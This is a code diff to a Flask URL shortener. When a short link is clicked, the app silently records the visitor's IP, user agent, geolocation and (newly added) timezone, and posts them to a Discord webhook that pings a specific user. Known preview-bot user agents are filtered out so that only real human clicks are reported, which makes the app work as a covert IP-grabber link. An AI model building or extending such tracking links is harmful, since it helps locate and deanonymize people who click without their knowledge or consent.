@@ -6,6 +6,7 @@ import requests
 import os
 from dotenv import load_dotenv
 from werkzeug.middleware.proxy_fix import ProxyFix
+from timezonefinder import TimezoneFinder
 
 # Load environment variables from .env file
 load_dotenv()
@@ -25,36 +26,21 @@ PASSWORD = os.getenv('URL_SHORTENER_PASSWORD')
 
 # User agents to ignore
 IGNORED_USER_AGENTS = [
-    # Discord bots
     "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; AppleWebKit/537.36 (KHTML, like Gecko) DiscordBots/25.1.4 Chrome/102.0.5005.167 Electron/19.0.17 Safari/537.36",
-    
-    # Facebook
     "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
-    
-    # Google
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0 (compatible; Googlebot-Image/1.0; +http://www.google.com/bot.html)",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-    
-    # Bing
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
-    
-    # Twitter
     "Twitterbot/1.0 (+http://www.twitter.com)",
     "Mozilla/5.0 (compatible; Twitterbot/1.0; +http://www.twitter.com/; @twitterbot)",
-    
-    # Google
     "Googlebot-News",
     "Googlebot-Image",
     "Googlebot-Video",
     "Googlebot-AdsBot",
     "Googlebot-Mobile",
-    
-    # Bing
     "BingPreview/1.0 (+http://www.bing.com/bingpreview)",
-    
-    # Twitter
     "Twitterbot/1.0",
     "Twitterbot/2.0",
 ]
@@ -81,27 +67,32 @@ def generate_short_url():
 # Function to get the real client IP address
 def get_client_ip():
     if 'X-Forwarded-For' in request.headers:
-        # X-Forwarded-For can contain a list of IPs
-        # The first IP is the original client's IP
         return request.headers.get('X-Forwarded-For').split(',')[0].strip()
     else:
         return request.remote_addr
 
+# Function to get the timezone based on IP address
+def get_timezone(ip):
+    geo_response = requests.get(f"http://ip-api.com/json/{ip}")
+    geo_data = geo_response.json()
+    latitude = geo_data.get('lat', None)
+    longitude = geo_data.get('lon', None)
+    if latitude is not None and longitude is not None:
+        tf = TimezoneFinder()
+        return tf.timezone_at(lng=longitude, lat=latitude)
+    return 'N/A'
+
 # Function to log IP, user agent, and URL to Discord
 def log_to_discord(ip, user_agent, short_path, original_url):
     if user_agent in IGNORED_USER_AGENTS:
-        return  # Do not send webhook for ignored user agents
+        return
     
-    # Remove 'https://' or 'http://' from the original URL
     original_url_no_https = original_url.replace('https://', '').replace('http://', '')
-    # Construct the full short URL
     short_url = f"<{request.host_url}{short_path}>"
     
-    # Get geolocation data
     geo_response = requests.get(f"http://ip-api.com/json/{ip}")
     geo_data = geo_response.json()
     
-    # Format geolocation data
     geo_info = (
         f"Country: {geo_data.get('country', 'N/A')}\n"
         f"Region: {geo_data.get('regionName', 'N/A')}\n"
@@ -111,12 +102,12 @@ def log_to_discord(ip, user_agent, short_path, original_url):
         f"AS: {geo_data.get('as', 'N/A')}\n"
     )
     
-    # Prepare the data to send to Discord
+    timezone = get_timezone(ip)
+    
     data = {
-        "content": f"<@938005604230918204> IP: {ip}\nUser-Agent: {user_agent}\nShort URL: {short_url}\nOriginal URL: {original_url_no_https}\n\nGeolocation Info:\n{geo_info}"
+        "content": f"<@938005604230918204> IP: {ip}\nUser-Agent: {user_agent}\nShort URL: {short_url}\nOriginal URL: {original_url_no_https}\n\nGeolocation Info:\n{geo_info}\nTimezone: {timezone}"
     }
     
-    # Send the webhook request
     response = requests.post(DISCORD_WEBHOOK_URL, json=data)
     if response.status_code != 204:
         print(f"Failed to send webhook: {response.status_code}, {response.text}")
@@ -154,7 +145,6 @@ def index():
     if request.method == 'POST':
         original_url = request.form['original_url']
         data = load_data()
-        # Check if the original URL already exists
         short_path = next((k for k, v in data['urls'].items() if v == original_url), None)
         if not short_path:
             short_path = generate_short_url()
